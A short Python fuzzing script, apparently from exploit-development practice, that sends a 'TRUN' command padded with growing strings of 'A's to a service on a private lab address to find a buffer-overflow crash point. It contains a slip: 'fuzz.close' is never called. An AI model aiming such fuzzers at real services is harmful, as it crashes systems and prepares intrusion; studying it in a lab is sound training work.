import socket, time, sys

ip = "192.168.56.132"
port = 9999
data = 100
step = 200
while data < 3000 :
    print("Sending %s value" %data)
    command = b"TRUN /.:/" + b"A" * data
    data = data + step
    fuzz = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    fuzz.connect((ip,port))
    fuzz.send(command)
    print(repr(fuzz.recv(1024)))
    time.sleep(0.7)
    fuzz.close
